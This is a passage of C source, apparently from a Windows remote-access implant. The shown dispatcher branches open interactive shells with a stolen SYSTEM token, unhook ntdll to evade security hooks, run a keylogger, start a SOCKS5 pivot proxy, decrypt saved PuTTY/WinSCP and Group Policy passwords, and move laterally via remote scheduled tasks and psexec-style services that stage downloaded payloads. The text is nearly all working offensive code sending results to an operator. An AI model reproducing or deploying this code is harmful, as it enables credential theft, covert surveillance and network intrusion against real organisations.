            agent_send_result(task->id,"","ISHELL already open; run ISHELL_CLOSE first"); return;
        }
        char shell_name[64] = {0};
        ishell_get_shell(args, shell_name, sizeof(shell_name));
        char shell_cmd[256];
        if (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
            strncpy(shell_cmd,"powershell.exe",sizeof(shell_cmd)-1);
        else
            strncpy(shell_cmd,"cmd.exe",sizeof(shell_cmd)-1);
        SECURITY_ATTRIBUTES sa2 = {sizeof(SECURITY_ATTRIBUTES),NULL,TRUE};
        HANDLE hStdinR=NULL,hStdinW=NULL,hStdoutR=NULL,hStdoutW=NULL;
        if (!CreatePipe(&hStdinR,&hStdinW,&sa2,0) ||
            !CreatePipe(&hStdoutR,&hStdoutW,&sa2,0)) {
            if (hStdinR) CloseHandle(hStdinR); if (hStdinW) CloseHandle(hStdinW);
            if (hStdoutR) CloseHandle(hStdoutR); if (hStdoutW) CloseHandle(hStdoutW);
            agent_send_result(task->id,"","CreatePipe failed"); return;
        }
        SetHandleInformation(hStdinW,HANDLE_FLAG_INHERIT,0);
        SetHandleInformation(hStdoutR,HANDLE_FLAG_INHERIT,0);
        STARTUPINFOW isi = {0}; isi.cb=sizeof(isi);
        isi.hStdInput=hStdinR; isi.hStdOutput=hStdoutW; isi.hStdError=hStdoutW;
        isi.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; isi.wShowWindow=SW_HIDE;
        PROCESS_INFORMATION ipi = {0};
        WCHAR shell_app_w[MAX_PATH] = {0};
        WCHAR shell_args_w[256] = {0};
        const char *shell_app = (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
            ? "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            : "C:\\Windows\\System32\\cmd.exe";
        const char *shell_args = (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
            ? "-NoLogo -NoProfile -NonInteractive" : "/Q";
        MultiByteToWideChar(CP_ACP,0,shell_app,-1,shell_app_w,MAX_PATH);
        MultiByteToWideChar(CP_ACP,0,shell_args,-1,shell_args_w,
                            (int)(sizeof(shell_args_w)/sizeof(shell_args_w[0])));
        HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
            (PVOID*)&g_system_token, NULL, NULL);
        BOOL proc_ok = FALSE;
        DWORD with_token_err = 0, as_user_err = 0, imp_err = 0;
        if (hSysTok) {
            HANDLE hSelf = NULL;
            if (OpenProcessToken(GetCurrentProcess(),
                                 TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hSelf)) {
                enable_privilege(hSelf,"SeImpersonatePrivilege");
                enable_privilege(hSelf,"SeIncreaseQuotaPrivilege");
                enable_privilege(hSelf,"SeAssignPrimaryTokenPrivilege");
                CloseHandle(hSelf);
            }
            enable_privilege(hSysTok,"SeImpersonatePrivilege");
            enable_privilege(hSysTok,"SeIncreaseQuotaPrivilege");
            enable_privilege(hSysTok,"SeAssignPrimaryTokenPrivilege");
            /* CreateProcessAsUserW is the pipe-safe path: unlike
               CreateProcessWithTokenW/seclogon it can inherit the handles
               already placed in STARTUPINFO. */
            WCHAR shell_args_user[256];
            memcpy(shell_args_user,shell_args_w,sizeof(shell_args_user));
            proc_ok = CreateProcessAsUserW(hSysTok,shell_app_w,shell_args_user,
                NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",
                &isi,&ipi);
            if (!proc_ok) as_user_err = GetLastError();
            if (!proc_ok) {
                proc_ok = CreateProcessWithTokenW(hSysTok,0,shell_app_w,shell_args_w,
                    CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
                if (!proc_ok) with_token_err = GetLastError();
            }
            if (!proc_ok) {
                if (ImpersonateLoggedOnUser(hSysTok)) {
                    WCHAR retry_args[256];
                    MultiByteToWideChar(CP_ACP,0,shell_args,-1,retry_args,
                                        (int)(sizeof(retry_args)/sizeof(retry_args[0])));
                    proc_ok = CreateProcessWithTokenW(hSysTok,0,shell_app_w,retry_args,
                        CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
                    if (!proc_ok) with_token_err = GetLastError();
                    RevertToSelf();
                } else {
                    imp_err = GetLastError();
                }
            }
        } else {
            proc_ok = CreateProcessW(shell_app_w,shell_args_w,NULL,NULL,TRUE,
                CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
            if (!proc_ok) with_token_err = GetLastError();
        }
        if (!proc_ok) {
            CloseHandle(hStdinR); CloseHandle(hStdinW);
            CloseHandle(hStdoutR); CloseHandle(hStdoutW);
            char e[192]; snprintf(e,sizeof(e),"CreateProcess shell failed; WithToken=%lu; AsUser=%lu; Impersonate=%lu",
                                   with_token_err,as_user_err,imp_err);
            agent_send_result(task->id,"",e); return;
        }
        CloseHandle(ipi.hThread);
        CloseHandle(hStdinR);
        CloseHandle(hStdoutW);
        g_ishell_proc     = ipi.hProcess;
        g_ishell_stdin_w  = hStdinW;
        g_ishell_stdout_r = hStdoutR;
        char out5[64]; snprintf(out5,sizeof(out5),"[+] ishell opened (%s)",shell_cmd);
        agent_send_result(task->id,out5,"");
    }
    else if (strcmp(type_upper, "ISHELL_RUN") == 0) {
        if (!g_ishell_proc) { agent_send_result(task->id,"","no active ishell; run ISHELL_OPEN first"); return; }
        char ish_cmd[4096] = {0};
        ishell_get_command(args, ish_cmd, sizeof(ish_cmd) - 96);

        char marker[64] = {0};
        snprintf(marker, sizeof(marker), "__SHLEOF__%lu_%lu",
                 (unsigned long)GetCurrentProcessId(),
                 (unsigned long)GetTickCount());
        char input[4096 + 96] = {0};
        int input_len = snprintf(input, sizeof(input), "%s\r\necho %s\r\n",
                                 ish_cmd, marker);
        if (input_len < 0 || (size_t)input_len >= sizeof(input)) {
            agent_send_result(task->id, "", "ishell command too long"); return;
        }

        DWORD written2 = 0;
        if (!WriteFile(g_ishell_stdin_w, input, (DWORD)input_len, &written2, NULL) ||
            written2 != (DWORD)input_len) {
            char e[96];
            snprintf(e, sizeof(e), "ishell stdin write failed (%lu)",
                     (unsigned long)GetLastError());
            agent_send_result(task->id, "", e); return;
        }

        char *ish_out = (char*)malloc(65536);
        if (!ish_out) { agent_send_result(task->id,"","oom"); return; }
        size_t ish_len = 0;
        int pipe_closed = 0;
        int marker_found = 0;
        ULONGLONG deadline = GetTickCount64() + 30000ULL;
        while (GetTickCount64() < deadline && ish_len + 1 < 65536) {
            int drain = ishell_drain_pipe(g_ishell_stdout_r, ish_out, 65536, &ish_len);
            if (drain < 0) { pipe_closed = 1; break; }
            if (strstr(ish_out, marker) != NULL) {
                marker_found = 1;
                break;
            }

            DWORD exit_code = STILL_ACTIVE;
            if (!GetExitCodeProcess(g_ishell_proc, &exit_code) ||
                exit_code != STILL_ACTIVE) {
                pipe_closed = 1;
                break;
            }
            Sleep(50);
        }

        ish_out[ish_len] = '\0';
        char *marker_pos = strstr(ish_out, marker);
        if (marker_pos) *marker_pos = '\0';
        char ish_err[128] = {0};
        if (!marker_found) {
            if (pipe_closed)
                snprintf(ish_err, sizeof(ish_err), "ishell closed before command completed");
            else
                snprintf(ish_err, sizeof(ish_err), "ishell timeout waiting for command output");
        }
        agent_send_result(task->id, ish_out, ish_err);
        free(ish_out);
    }
    else if (strcmp(type_upper, "ISHELL_CLOSE") == 0) {
        if (!g_ishell_proc) { agent_send_result(task->id,"","no active ishell"); return; }
        TerminateProcess(g_ishell_proc,0);
        CloseHandle(g_ishell_proc); g_ishell_proc=NULL;
        if (g_ishell_stdin_w)  { CloseHandle(g_ishell_stdin_w);  g_ishell_stdin_w=NULL; }
        if (g_ishell_stdout_r) { CloseHandle(g_ishell_stdout_r); g_ishell_stdout_r=NULL; }
        agent_send_result(task->id,"[+] ishell closed","");
    }
    // ── FEATURE 5: NTDLL_UNHOOK ──────────────────────────────────────────────
    else if (strcmp(type_upper, "NTDLL_UNHOOK") == 0) {
        HMODULE hCur = GetModuleHandleW(L"ntdll.dll");
        HMODULE hFresh = LoadLibraryExW(L"ntdll.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
        if (!hCur || !hFresh) {
            if (hFresh) FreeLibrary(hFresh);
            agent_send_result(task->id,"","failed to get ntdll handles"); return;
        }
        BYTE *fresh  = (BYTE*)hFresh;
        BYTE *current = (BYTE*)hCur;
        IMAGE_DOS_HEADER *dos2 = (IMAGE_DOS_HEADER*)fresh;
        IMAGE_NT_HEADERS *nt2  = (IMAGE_NT_HEADERS*)(fresh + dos2->e_lfanew);
        IMAGE_DATA_DIRECTORY *expd = &nt2->OptionalHeader.DataDirectory[0];
        int unhooked = 0;
        if (expd->VirtualAddress) {
            IMAGE_EXPORT_DIRECTORY *exp2 = (IMAGE_EXPORT_DIRECTORY*)(fresh + expd->VirtualAddress);
            DWORD *names2 = (DWORD*)(fresh + exp2->AddressOfNames);
            DWORD *funcs2 = (DWORD*)(fresh + exp2->AddressOfFunctions);
            WORD  *ords2  = (WORD*)(fresh  + exp2->AddressOfNameOrdinals);
            for (DWORD ei = 0; ei < exp2->NumberOfNames; ei++) {
                const char *fname = (const char*)(fresh + names2[ei]);
                if (fname[0] != 'N' || fname[1] != 't') continue;
                DWORD frva = funcs2[ords2[ei]];
                BYTE *fresh_fn   = fresh   + frva;
                BYTE *cur_fn     = current + frva;
                if (cur_fn[0] == 0xE9) { /* JMP = hooked */
                    DWORD oprot2 = 0;
                    if (VirtualProtect(cur_fn,16,PAGE_EXECUTE_READWRITE,&oprot2)) {
                        memcpy(cur_fn,fresh_fn,16);
                        VirtualProtect(cur_fn,16,oprot2,&oprot2);
                        unhooked++;
                    }
                }
            }
        }
        FreeLibrary(hFresh);
        char out6[64]; snprintf(out6,sizeof(out6),"[+] unhooked %d Nt* functions",unhooked);
        agent_send_result(task->id,out6,"");
    }
    // ── FEATURE 6: Keylogger ─────────────────────────────────────────────────
    else if (strcmp(type_upper, "KEYLOG_START") == 0) {
        if (g_keylog_thread && !g_keylog_stop) {
            agent_send_result(task->id,"","keylogger already running"); return;
        }
        g_keylog_len  = 0;
        g_keylog_stop = 1;
        g_keyhook     = NULL;
        g_keylog_thread = CreateThread(NULL,0,KeylogThread,NULL,0,&g_keylog_tid);
        if (!g_keylog_thread) {
            char e[64]; snprintf(e,sizeof(e),"CreateThread failed %lu",GetLastError());
            agent_send_result(task->id,"",e);
        } else {
            agent_send_result(task->id,"[+] keylogger started","");
        }
    }
    else if (strcmp(type_upper, "KEYLOG_STOP") == 0) {
        g_keylog_stop = 1;
        if (g_keylog_tid) PostThreadMessageW(g_keylog_tid,WM_QUIT,0,0);
        if (g_keylog_thread) {
            WaitForSingleObject(g_keylog_thread,3000);
            CloseHandle(g_keylog_thread); g_keylog_thread=NULL;
        }
        g_keylog_tid = 0;
        agent_send_result(task->id,"[+] keylogger stopped","");
    }
    else if (strcmp(type_upper, "KEYLOG_DUMP") == 0) {
        g_keylog_buf[g_keylog_len] = '\0';
        agent_send_result(task->id,g_keylog_buf,"");
        g_keylog_len = 0;
    }
    // ── FEATURE 7: SOCKS5 proxy ──────────────────────────────────────────────
    else if (strcmp(type_upper, "SOCKS_START") == 0) {
        if (!g_socks_stop) { agent_send_result(task->id,"","SOCKS5 already running"); return; }
        int socks_port = json_get_int(args,"port",1080);
        WSADATA wsd; WSAStartup(MAKEWORD(2,2),&wsd);
        g_socks_listen = socket(AF_INET,SOCK_STREAM,0);
        if (g_socks_listen==INVALID_SOCKET) {
            agent_send_result(task->id,"","socket() failed"); return;
        }
        int reuse=1; setsockopt(g_socks_listen,SOL_SOCKET,SO_REUSEADDR,(char*)&reuse,sizeof(reuse));
        struct sockaddr_in sa_in;
        memset(&sa_in,0,sizeof(sa_in));
        sa_in.sin_family=AF_INET; sa_in.sin_port=htons((u_short)socks_port);
        sa_in.sin_addr.s_addr=INADDR_ANY;
        if (bind(g_socks_listen,(struct sockaddr*)&sa_in,sizeof(sa_in))!=0 ||
            listen(g_socks_listen,64)!=0) {
            closesocket(g_socks_listen); g_socks_listen=INVALID_SOCKET;
            char e[64]; snprintf(e,sizeof(e),"bind/listen failed %d",WSAGetLastError());
            agent_send_result(task->id,"",e); return;
        }
        g_socks_stop   = 0;
        g_socks_thread = CreateThread(NULL,0,SocksListenThread,NULL,0,NULL);
        if (!g_socks_thread) {
            g_socks_stop = 1; closesocket(g_socks_listen); g_socks_listen=INVALID_SOCKET;
            char e[64]; snprintf(e,sizeof(e),"CreateThread failed %lu",GetLastError());
            agent_send_result(task->id,"",e); return;
        }
        char out7[64]; snprintf(out7,sizeof(out7),"[+] SOCKS5 listening on port %d",socks_port);
        agent_send_result(task->id,out7,"");
    }
    else if (strcmp(type_upper, "SOCKS_STOP") == 0) {
        g_socks_stop = 1;
        if (g_socks_listen!=INVALID_SOCKET) { closesocket(g_socks_listen); g_socks_listen=INVALID_SOCKET; }
        if (g_socks_thread) {
            WaitForSingleObject(g_socks_thread,3000);
            CloseHandle(g_socks_thread); g_socks_thread=NULL;
        }
        agent_send_result(task->id,"[+] SOCKS5 stopped","");
    }
    // ── FEATURE 8: SESSION_GOPHER ─────────────────────────────────────────────
    else if (strcmp(type_upper, "SESSION_GOPHER") == 0 || strcmp(type_upper, "SESSION_CREDS") == 0) {
        size_t sg_cap=65536, sg_len=0;
        char *sg_out = (char*)malloc(sg_cap);
        if (!sg_out) { agent_send_result(task->id,"","oom"); return; }
        sg_out[0]='\0';
        HKEY hk2;
        /* PuTTY sessions */
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\SimonTatham\\PuTTY\\Sessions",0,KEY_READ,&hk2)==ERROR_SUCCESS) {
            const char *hdr2="=== PuTTY Sessions ===\n";
            size_t hl2=strlen(hdr2);
            if (sg_len+hl2<sg_cap){memcpy(sg_out+sg_len,hdr2,hl2);sg_len+=hl2;}
            DWORD idx2=0; char sn[512]; DWORD sl2=sizeof(sn);
            while (RegEnumKeyExA(hk2,idx2++,sn,&sl2,NULL,NULL,NULL,NULL)==ERROR_SUCCESS) {
                HKEY hses2;
                char fk[640];
                snprintf(fk,sizeof(fk),"Software\\SimonTatham\\PuTTY\\Sessions\\%s",sn);
                if (RegOpenKeyExA(HKEY_CURRENT_USER,fk,0,KEY_READ,&hses2)==ERROR_SUCCESS) {
                    char hn[256]={0},un[256]={0}; DWORD pn=22;
                    DWORD vs=sizeof(hn);
                    RegQueryValueExA(hses2,"HostName",NULL,NULL,(LPBYTE)hn,&vs);
                    vs=sizeof(un);
                    RegQueryValueExA(hses2,"UserName",NULL,NULL,(LPBYTE)un,&vs);
                    vs=sizeof(pn);
                    RegQueryValueExA(hses2,"PortNumber",NULL,NULL,(LPBYTE)&pn,&vs);
                    RegCloseKey(hses2);
                    char ent[512];
                    int el3=(int)snprintf(ent,sizeof(ent),"  [%s] %s@%s:%lu\n",
                        sn,un[0]?un:"(none)",hn[0]?hn:"(none)",(unsigned long)pn);
                    if (el3>0&&sg_len+(size_t)el3<sg_cap){memcpy(sg_out+sg_len,ent,el3);sg_len+=el3;}
                }
                sl2=sizeof(sn);
            }
            RegCloseKey(hk2);
        }
        /* WinSCP sessions */
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Martin Prikryl\\WinSCP 2\\Sessions",0,KEY_READ,&hk2)==ERROR_SUCCESS) {
            const char *hdr3="=== WinSCP Sessions ===\n";
            size_t hl3=strlen(hdr3);
            if (sg_len+hl3<sg_cap){memcpy(sg_out+sg_len,hdr3,hl3);sg_len+=hl3;}
            DWORD idx3=0; char sn2[512]; DWORD sl3=sizeof(sn2);
            while (RegEnumKeyExA(hk2,idx3++,sn2,&sl3,NULL,NULL,NULL,NULL)==ERROR_SUCCESS) {
                HKEY hses3;
                char fk2[640];
                snprintf(fk2,sizeof(fk2),"Software\\Martin Prikryl\\WinSCP 2\\Sessions\\%s",sn2);
                if (RegOpenKeyExA(HKEY_CURRENT_USER,fk2,0,KEY_READ,&hses3)==ERROR_SUCCESS) {
                    char hn2[256]={0},un2[256]={0},pw_hex[2048]={0};
                    DWORD vs2=sizeof(hn2);
                    RegQueryValueExA(hses3,"HostName",NULL,NULL,(LPBYTE)hn2,&vs2);
                    vs2=sizeof(un2);
                    RegQueryValueExA(hses3,"UserName",NULL,NULL,(LPBYTE)un2,&vs2);
                    vs2=sizeof(pw_hex);
                    RegQueryValueExA(hses3,"Password",NULL,NULL,(LPBYTE)pw_hex,&vs2);
                    RegCloseKey(hses3);
                    /* Decrypt WinSCP password: nibble-swap then XOR 0xA3, skip 3-byte header */
                    char decpw[512]={0}; int dplen=0;
                    const char *hp=pw_hex;
                    while (hp[0]&&hp[1]&&dplen<(int)sizeof(decpw)-1) {
                        unsigned int b2=0; sscanf(hp,"%2x",&b2); hp+=2;
                        decpw[dplen++]=(char)((((b2&0x0F)<<4)|((b2&0xF0)>>4))^0xA3);
                    }
                    decpw[dplen]='\0';
                    char *pw_out2 = (dplen>3) ? decpw+3 : decpw;
                    char ent2[768];
                    int el4=(int)snprintf(ent2,sizeof(ent2),"  [%s] %s@%s pass=%s\n",
                        sn2,un2[0]?un2:"(none)",hn2[0]?hn2:"(none)",
                        pw_out2[0]?pw_out2:"(none)");
                    if (el4>0&&sg_len+(size_t)el4<sg_cap){memcpy(sg_out+sg_len,ent2,el4);sg_len+=el4;}
                }
                sl3=sizeof(sn2);
            }
            RegCloseKey(hk2);
        }
        sg_out[sg_len]='\0';
        if (!sg_len) strncpy(sg_out,"(no sessions found)",sg_cap-1);
        agent_send_result(task->id,sg_out,""); free(sg_out);
    }
    // ── FEATURE 9: GPP_HUNT ──────────────────────────────────────────────────
    else if (strcmp(type_upper, "GPP_HUNT") == 0 || strcmp(type_upper, "GPP_PASSWORDS") == 0) {
        char *xml_list = run_shell("dir /s /b \\\\%LOGONSERVER%\\SYSVOL\\*.xml 2>nul");
        if (!xml_list) { agent_send_result(task->id,"","dir failed"); return; }
        size_t gpp_cap=65536, gpp_len=0;
        char *gpp_out=(char*)malloc(gpp_cap);
        if (!gpp_out) { free(xml_list); agent_send_result(task->id,"","oom"); return; }
        gpp_out[0]='\0';
        char *xline=strtok(xml_list,"\r\n");
        while (xline) {
            /* Trim trailing whitespace */
            size_t xl=strlen(xline);
            while (xl>0 && (xline[xl-1]=='\r'||xline[xl-1]=='\n'||xline[xl-1]==' ')) xline[--xl]='\0';
            if (xl==0) { xline=strtok(NULL,"\r\n"); continue; }
            HANDLE hxf=CreateFileA(xline,GENERIC_READ,FILE_SHARE_READ,NULL,
                                   OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
            if (hxf!=INVALID_HANDLE_VALUE) {
                DWORD fsz=GetFileSize(hxf,NULL);
                if (fsz>0&&fsz<(10*1024*1024)) {
                    char *xdata=(char*)malloc(fsz+1);
                    DWORD rd2=0;
                    if (xdata&&ReadFile(hxf,xdata,fsz,&rd2,NULL)) {
                        xdata[rd2]='\0';
                        char *cp=xdata;
                        while ((cp=strstr(cp,"cpassword=\""))!=NULL) {
                            cp+=11;
                            char *ce=strchr(cp,'"');
                            if (!ce) break;
                            size_t cvlen=(size_t)(ce-cp);
                            char *b64v=(char*)malloc(cvlen+1);
                            if (b64v) {
                                memcpy(b64v,cp,cvlen); b64v[cvlen]='\0';
                                /* Find nearby userName */
                                char uname2[256]="";
                                char *ctx2 = cp-500; if(ctx2<xdata) ctx2=xdata;
                                char *up3=strstr(ctx2,"userName=\"");
                                if (up3&&up3<cp+200) {
                                    up3+=10; char *ue2=strchr(up3,'"');
                                    if (ue2&&(size_t)(ue2-up3)<sizeof(uname2)) {
                                        memcpy(uname2,up3,(size_t)(ue2-up3));
                                        uname2[(size_t)(ue2-up3)]='\0';
                                    }
                                }
                                char *decpw2=gpp_decrypt_cpassword(b64v);
                                char gent[1024];
                                int gel=(int)snprintf(gent,sizeof(gent),
                                    "[GPP] file=%s user=%s pass=%s\n",
                                    xline,uname2[0]?uname2:"(unknown)",
                                    decpw2?decpw2:"?");
                                if (gel>0&&gpp_len+(size_t)gel<gpp_cap){
                                    memcpy(gpp_out+gpp_len,gent,gel); gpp_len+=gel;
                                }
                                free(b64v); free(decpw2);
                            }
                            cp=ce+1;
                        }
                    }
                    free(xdata);
                }
                CloseHandle(hxf);
            }
            xline=strtok(NULL,"\r\n");
        }
        free(xml_list);
        gpp_out[gpp_len]='\0';
        if (!gpp_len) strncpy(gpp_out,"(no GPP passwords found)",gpp_cap-1);
        agent_send_result(task->id,gpp_out,""); free(gpp_out);
    }
    // ── FEATURE 10: LATERAL ──────────────────────────────────────────────────
    else if (strcmp(type_upper, "LATERAL") == 0 || strcmp(type_upper, "JUMP") == 0) {
        char lat_method[32]={0},lat_host[256]={0},lat_user[256]={0};
        char lat_pass[256]={0},lat_cmd[1024]={0};
        json_get_str(args,"method",lat_method,sizeof(lat_method),"atexec");
        json_get_str(args,"host",lat_host,sizeof(lat_host),"");
        json_get_str(args,"user",lat_user,sizeof(lat_user),"");
        json_get_str(args,"pass",lat_pass,sizeof(lat_pass),"");
        json_get_str(args,"cmd",lat_cmd,sizeof(lat_cmd),"");
        char lat_payload[256]={0};
        json_get_str(args,"payload",lat_payload,sizeof(lat_payload),"");
        /* GUI sends payload= (filename) instead of cmd= in JUMP/privesc flows */
        if (lat_payload[0] && !lat_cmd[0]) {
            if (_stricmp(lat_payload, "self") == 0) {
                /* "self" — reuse this agent's own executable on disk */
                GetModuleFileNameA(NULL, lat_cmd, (DWORD)sizeof(lat_cmd));
            } else {
                size_t pl_len=0;
                uint8_t *pl_data = NULL;
                int pl_owned = 0;
                if (task->payload && task->payload_len) {
                    pl_data = task->payload;
                    pl_len = task->payload_len;
                } else {
                    pl_data = agent_download_file(lat_payload, &pl_len);
                    pl_owned = 1;
                }
                if (!pl_data||pl_len==0) {
                    if (pl_owned) free(pl_data);
                    agent_send_result(task->id,"","LATERAL: payload download failed"); return;
                }
                const char *tmp=getenv("TEMP"); if(!tmp)tmp="C:\\Windows\\Temp";
                snprintf(lat_cmd,sizeof(lat_cmd),"%s\\%s",tmp,lat_payload);
                FILE *pf=fopen(lat_cmd,"wb");
                if (!pf) {
                    if (pl_owned) free(pl_data);
                    agent_send_result(task->id,"","LATERAL: cannot stage inline payload"); return;
                }
                fwrite(pl_data,1,pl_len,pf); fclose(pf);
                if (pl_owned) free(pl_data);
            }
        }
        if (!lat_host[0]) { agent_send_result(task->id,"","LATERAL: host required"); return; }
        char lat_buf[4096];
        if (_stricmp(lat_method,"atexec")==0) {
            char at_tn[32];
            snprintf(at_tn, sizeof(at_tn), "svc%08x", (unsigned)GetTickCount());
            /* Authenticate */
            snprintf(lat_buf,sizeof(lat_buf),
                "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>&1",lat_host,lat_pass,lat_user);
            char *lr1=run_shell(lat_buf); free(lr1);
            /* Output file */
            char outf[512];
            snprintf(outf,sizeof(outf),"\\\\%s\\admin$\\__eg_out_%lu.txt",
                lat_host,(unsigned long)GetCurrentProcessId());
            /* Create task */
            char at_start[8];
            runas_start_time(at_start, sizeof(at_start));
            snprintf(lat_buf,sizeof(lat_buf),
                "schtasks /Create /S %s /RU SYSTEM /SC ONCE /ST %s /F "
                "/TN %s /TR \"cmd /c %s > %s 2>&1\" 2>&1",
                lat_host,at_start,at_tn,lat_cmd,outf);
            char *lr2=run_shell(lat_buf); free(lr2);
            /* Run task */
            snprintf(lat_buf,sizeof(lat_buf),
                "schtasks /Run /S %s /TN %s 2>&1",lat_host,at_tn);
            char *lr3=run_shell(lat_buf); free(lr3);
            Sleep(5000);
            /* Read output */
            snprintf(lat_buf,sizeof(lat_buf),"type \"%s\" 2>&1",outf);
            char *lat_result=run_shell(lat_buf);
            agent_send_result(task->id,lat_result?lat_result:"(no output)","");
            free(lat_result);
            /* Cleanup */
            snprintf(lat_buf,sizeof(lat_buf),
                "schtasks /Delete /S %s /TN %s /F 2>&1",lat_host,at_tn);
            char *lr4=run_shell(lat_buf); free(lr4);
            DeleteFileA(outf);
            snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
            char *lr5=run_shell(lat_buf); free(lr5);
        } else if (_stricmp(lat_method,"psexec")==0) {
            /* Generate random service/exe name */
            char svc_name[32];
            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
            char exe_name[64];
            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);

            /* Load payload — prefer lat_payload URL, fall back to lat_cmd path */
            uint8_t *payload_data = NULL;
            size_t payload_len = 0;
            if (!lat_cmd[0] && lat_payload[0])
                payload_data = agent_download_file(lat_payload, &payload_len);
            if (!payload_data || !payload_len) {
                free(payload_data); payload_data = NULL;
                if (lat_cmd[0]) {
                    FILE *pf = fopen(lat_cmd, "rb");
                    if (pf) {
                        fseek(pf, 0, SEEK_END); payload_len = (size_t)ftell(pf); rewind(pf);
                        payload_data = (uint8_t*)malloc(payload_len);
                        if (payload_data) fread(payload_data, 1, payload_len, pf);
                        fclose(pf);
                    }
                }
            }
            if (!payload_data || !payload_len) {
                free(payload_data);
                agent_send_result(task->id, "", "psexec: no payload"); return;
            }

            /* Stage payload to remote host via SMB */
            const char *remote_path = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
            free(payload_data);
            if (!remote_path) {
                smb_stage_cleanup(lat_host, lat_user);
                agent_send_result(task->id, "", "psexec: SMB staging failed"); return;
            }

            /* Open remote SCM and create/start/delete transient service */
            WCHAR whost[256]={0}, wsvc[64]={0}, wpath[512]={0};
            MultiByteToWideChar(CP_ACP, 0, lat_host,    -1, whost, 256);
            MultiByteToWideChar(CP_ACP, 0, svc_name,    -1, wsvc,  64);
            MultiByteToWideChar(CP_ACP, 0, remote_path, -1, wpath, 512);
            SC_HANDLE hScm = OpenSCManagerW(whost, NULL, SC_MANAGER_ALL_ACCESS);
            if (!hScm) {
                char e[128];
                snprintf(e, sizeof(e), "psexec: OpenSCManager failed: %lu", GetLastError());
                smb_stage_cleanup(lat_host, lat_user);
                agent_send_result(task->id, "", e); return;
            }
            SC_HANDLE hSvc = CreateServiceW(hScm, wsvc, wsvc, SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                wpath, NULL, NULL, NULL, NULL, NULL);
            if (!hSvc) {
                char e[128];
                snprintf(e, sizeof(e), "psexec: CreateService failed: %lu", GetLastError());
                CloseServiceHandle(hScm);
                smb_stage_cleanup(lat_host, lat_user);
                agent_send_result(task->id, "", e); return;
            }
            StartServiceW(hSvc, 0, NULL);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            smb_stage_cleanup(lat_host, lat_user);
            char res_ps[512];
            snprintf(res_ps, sizeof(res_ps),
                "[+] psexec → %s\n    svc : %s\n    path: %s", lat_host, svc_name, remote_path);
            agent_send_result(task->id, res_ps, "");
        } else if (_stricmp(lat_method,"runas")==0) {
            /* Prefer direct credential-backed creation, with token APIs inside
             * the helper as a compatibility fallback. */
            char ru_tn[32];
            snprintf(ru_tn, sizeof(ru_tn), "svc%08x", (unsigned)GetTickCount());
            const char *ru=lat_user;
            if(strncmp(lat_user,".\\",2)==0)ru=lat_user+2;
            else if(strncmp(lat_user,"./",2)==0)ru=lat_user+2;
            /* Stage to world-readable path */
            char pub_path[512]={0};
            const char *base=strrchr(lat_cmd,'\\');
            if (!base) base = strrchr(lat_cmd,'/');
            base = base ? base+1 : lat_cmd;
            if (!base[0]) {
                agent_send_result(task->id, "", "runas: payload path is empty"); return;
            }
            snprintf(pub_path, sizeof(pub_path), "C:\\Users\\Public\\%s", base);
            if (_stricmp(lat_cmd, pub_path) != 0 && !CopyFileA(lat_cmd, pub_path, FALSE)) {
                DWORD copy_err = GetLastError();
                char stage_err[256];
                snprintf(stage_err, sizeof(stage_err),
                         "runas: could not stage payload in C:\\Users\\Public (CopyFileA error %lu)",
                         (unsigned long)copy_err);
                agent_send_result(task->id, "", stage_err);
                return;
            }
            if (GetFileAttributesA(pub_path) == INVALID_FILE_ATTRIBUTES) {
                agent_send_result(task->id, "", "runas: could not stage payload in C:\\Users\\Public");
                return;
            }
            char direct_err[256] = {0};
            DWORD direct_pid = 0;
            if (spawn_as_user_direct(pub_path, lat_user, lat_pass, &direct_pid,
                                     direct_err, sizeof(direct_err))) {
                char direct_res[1024];
                snprintf(direct_res, sizeof(direct_res),
                         "[+] runas → %s @ %s\n    cmd: %s\n    pid: %lu\n    method: direct credentials/token (CreateProcessWithLogonW preferred)",
                         ru, lat_host, pub_path, (unsigned long)direct_pid);
                agent_send_result(task->id, direct_res, "");
                return;
            }

            char ru_res[4096]={0};
            char start_at[8];
            runas_start_time(start_at, sizeof(start_at));
            snprintf(lat_buf,sizeof(lat_buf),
                "schtasks /Create /SC ONCE /ST %s /RL HIGHEST /F /TN %s "
                "/TR \"%s\" /RU \"%s\" /RP \"%s\" 2>&1",
                start_at,ru_tn,pub_path,ru,lat_pass);
            char *rr1=run_shell(lat_buf);
            if (shell_output_is_error(rr1)) {
                char fallback_err[4608];
                snprintf(fallback_err, sizeof(fallback_err),
                         "[direct token failed: %s]\n%s", direct_err,
                         rr1 ? rr1 : "runas: schtasks /Create failed");
                agent_send_result(task->id, "", fallback_err);
                free(rr1);
                return;
            }
            snprintf(ru_res,sizeof(ru_res),
                     "[+] runas → %s @ %s\n    cmd: %s\n    method: schtasks fallback (/ST %s)\n    direct token failed: %s\n%s\n",
                ru,lat_host,pub_path,start_at,direct_err,rr1?rr1:"");
            free(rr1);
